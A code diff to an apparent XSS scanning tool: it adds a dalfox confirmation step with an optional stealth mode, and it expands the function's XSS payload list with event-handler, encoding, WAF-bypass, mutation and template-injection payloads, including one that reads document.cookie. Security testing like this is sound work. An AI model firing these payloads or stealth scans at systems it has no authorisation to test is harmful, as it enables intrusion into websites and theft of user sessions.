@@ -58,16 +58,228 @@ def stored_xss_scanner(url: str, params: str = "", check_url: str = "") -> str:
     ]
     verify_url = check_url if check_url else url
 
+    # ── DALFOX CONFIRMATION FUNCTION ──────────────────────────────────────────
+    def _run_dalfox_confirmation(base_url: str, verify_url: str, params: list, logger) -> dict:
+        """
+        Run dalfox sebagai confirmation step untuk XSS.
+        Return dict dengan is_confirmed, evidence, severity.
+        """
+        import subprocess
+        import tempfile
+        import os
+
+        tool_name = "XSS Confirmation (dalfox)"
+        logger.add_log(tool_name, "PROCESSING", f"Running dalfox on {base_url}")
+
+        try:
+            # Create temp output file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                output_file = f.name
+
+            # Run dalfox with pipe mode (URL from stdin)
+            cmd = [
+                "dalfox",
+                "pipe",
+                "--format", "json",
+                "--output", output_file,
+                "--timeout", "10",
+                "--worker", "3",
+            ]
+
+            # Apply stealth mode if enabled
+            if os.environ.get("STEALTH_MODE", "0") == "1":
+                cmd.extend([
+                    "--delay", "1000",
+                    "--worker", "1",
+                    "--timeout", "30",
+                ])
+
+            # Create input with target URL
+            input_data = base_url
+
+            result = subprocess.run(
+                cmd,
+                input=input_data,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=60,  # 1 minute timeout
+            )
+
+            # Check if output file has results
+            findings = []
+            if os.path.exists(output_file):
+                with open(output_file, 'r') as f:
+                    for line in f:
+                        try:
+                            import json
+                            data = json.loads(line.strip())
+                            findings.append(data)
+                        except:
+                            pass
+                os.unlink(output_file)
+
+            # Parse dalfox output from stdout as backup
+            output = result.stdout + result.stderr
+
+            # Check for XSS indicators
+            xss_indicators = [
+                "reflected",
+                "xss",
+                "vulnerable",
+                "alert(",
+                "confirmed",
+            ]
+
+            is_vulnerable = any(indicator.lower() in output.lower() for indicator in xss_indicators) or len(findings) > 0
+
+            if is_vulnerable:
+                evidence = output[:500] if output else f"Found {len(findings)} XSS findings"
+                logger.add_log(tool_name, "WARNING", f"dalfox CONFIRMED XSS vulnerability")
+                return {
+                    "is_confirmed": True,
+                    "severity": "Critical",
+                    "evidence": evidence,
+                    "findings": findings[:5],
+                    "tool": "dalfox",
+                }
+            else:
+                logger.add_log(tool_name, "INFO", "dalfox did not confirm XSS vulnerability")
+                return {
+                    "is_confirmed": False,
+                    "severity": "Low",
+                    "tool": "dalfox",
+                    "note": "dalfox could not confirm XSS",
+                }
+
+        except subprocess.TimeoutExpired:
+            logger.add_log(tool_name, "WARNING", "dalfox timed out after 60s")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "dalfox",
+                "note": "dalfox execution timed out",
+            }
+        except FileNotFoundError:
+            logger.add_log(tool_name, "WARNING", "dalfox not found - skipping external confirmation")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "dalfox",
+                "note": "dalfox not installed",
+            }
+        except Exception as e:
+            logger.add_log(tool_name, "WARNING", f"dalfox error: {str(e)[:100]}")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "dalfox",
+                "note": f"dalfox error: {str(e)[:100]}",
+            }
+
     # Unique marker biar bisa track payload spesifik
     marker = "NEXUSXSS42"
+
+    # ── COMPREHENSIVE XSS PAYLOAD LIBRARY ─────────────────────────────────────
     xss_payloads = [
+        # Basic script injection
         f'<script>alert("{marker}")</script>',
+        f'<script>alert(`{marker}`)</script>',
+        f'<script>alert(1)</script>',
+        f'<script>alert(document.domain)</script>',
+        f'<script>alert(document.cookie)</script>',
+
+        # Event handler-based
         f'<img src=x onerror=alert("{marker}")>',
         f'<svg onload=alert("{marker}")>',
-        f'"><script>alert("{marker}")</script>',
-        f"'><img src=x onerror=alert('{marker}')>",
         f'<body onload=alert("{marker}")>',
         f'<details open ontoggle=alert("{marker}")>',
+        f'<input onfocus=alert("{marker}") autofocus>',
+        f'<marquee onstart=alert("{marker}")>',
+        f'<video><source onerror=alert("{marker}")>',
+        f'<audio src=x onerror=alert("{marker}")>',
+        f'<object data="javascript:alert(\'{marker}\')">',
+        f'<iframe onload=alert("{marker}")>',
+
+        # Attribute injection
+        f'" onmouseover=alert("{marker}") "',
+        f"' onmouseover=alert('{marker}') '",
+        f'" onfocus=alert("{marker}") "',
+        f"' onfocus=alert('{marker}') '",
+        f'" onmouseover=alert("{marker}")',
+        f"' onmouseover=alert('{marker}')",
+
+        # Tag-based bypass
+        f'<scr<script>ipt>alert("{marker}")</scr</script>ipt>',
+        f'<scr\x00ipt>alert("{marker}")</script>',
+        f'<scrip<script></script>t>alert("{marker}")</script>',
+        f'<ScRiPt>alert("{marker}")</ScRiPt>',
+        f'<SCRIPT>alert("{marker}")</SCRIPT>',
+
+        # Encoding bypass
+        f'&#60;script&#62;alert("{marker}")&#60;/script&#62;',
+        f'&#x3C;script&#x3E;alert("{marker}")&#x3C;/script&#x3E;',
+        f'\x3cscript\x3ealert("{marker}")\x3c/script\x3e',
+
+        # HTML entities
+        f'&lt;script&gt;alert("{marker}")&lt;/script&gt;',
+        f'&lt;script&gt;alert(&#39;{marker}&#39;)&lt;/script&gt;',
+
+        # Template literal
+        f'${{alert("{marker}")}}',
+        f'{{constructor.constructor("alert(\\"{marker}\\")")()}}',
+
+        # SVG-based
+        f'<svg/onload=alert("{marker}")>',
+        f'<svg onload=alert("{marker}")>',
+        f'<svg><script>alert("{marker}")</script></svg>',
+        f'<svg><animate onbegin=alert("{marker}") attributeName=x dur=1s>',
+
+        # Polyglot payloads
+        f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert("{marker}"))//',
+
+        # CSS-based
+        f'<div style="background:url(javascript:alert(\'{marker}\'))">',
+        f'<div style="width:expression(alert(\'{marker}\'))">',
+
+        # Frame-based
+        f'<iframe src="javascript:alert(\'{marker}\')">',
+        f'<object type="text/html" data="javascript:alert(\'{marker}\')">',
+
+        # Data URI
+        f'<a href="data:text/html,<script>alert(\'{marker}\')</script>">Click</a>',
+
+        # Null byte bypass
+        f'<scri%00pt>alert("{marker}")</script>',
+        f'<scr%00ipt>alert("{marker}")</script>',
+
+        # Case variation
+        f'<ScRiPt>alert("{marker}")</ScRiPt>',
+        f'<SCRIPT>alert("{marker}")</SCRIPT>',
+
+        # Double encoding
+        f'%253Cscript%253Ealert("{marker}")%253C/script%253E',
+
+        # Mutation XSS
+        f'<noscript><p title="</noscript><script>alert(\'{marker}\')"></p></noscript>',
+
+        # Template injection
+        f'{{alert("{marker}")}}',
+        f'${alert("{marker}")}',
+        f'<%=alert("{marker}")%>',
+
+        # WAF bypass patterns
+        f'<img src="x" onerror="&#97;lert(\'{marker}\')">',
+        f'<img src="x" onerror="eval(atob(\'YWxlcnQoJ3t7bWFya2VyfX0nKQ==\'))">',
+        f'<svg onload="window[\'al\'+\'ert\'](\'{marker}\')">',
+        f'<svg onload="self[\'al\'+\'ert\'](\'{marker}\')">',
+
+        # DOM clobbering
+        f'<a href="javascript:alert(\'{marker}\')" id="xss">click</a>',
+
+        # Template engines
+        f'{{constructor.constructor("alert(\'{marker}\')")()}}',
+        f'${{this.constructor.constructor("alert(\'{marker}\')")()}}',
     ]
 
     vulnerabilities = []
@@ -102,6 +314,25 @@ def stored_xss_scanner(url: str, params: str = "", check_url: str = "") -> str:
                     break  # confirmed for this param, move on
             except Exception:
                 pass
+
+    # ── DALFOX CONFIRMATION STEP ──────────────────────────────────────────────
+    if vulnerabilities:
+        dalfox_result = _run_dalfox_confirmation(url, verify_url, param_list, logger)
+        if dalfox_result.get("is_confirmed"):
+            # Enhance existing findings with dalfox confirmation
+            for vuln in vulnerabilities:
+                vuln["dalfox_confirmed"] = True
+                vuln["dalfox_evidence"] = dalfox_result.get("evidence", "")
+                vuln["severity"] = "Critical"
+                logger.add_log(tool_name, "WARNING",
+                    f"dalfox CONFIRMED XSS on {vuln['parameter']}")
+        else:
+            # Keep findings but mark as custom detection only
+            for vuln in vulnerabilities:
+                vuln["dalfox_confirmed"] = False
+                vuln["note"] = "Detected by custom scanner, not confirmed by dalfox"
+                logger.add_log(tool_name, "INFO",
+                    "dalfox did not confirm XSS - keeping as medium confidence")
 
     result = {
         "status": "VULNERABLE" if vulnerabilities else "SAFE",
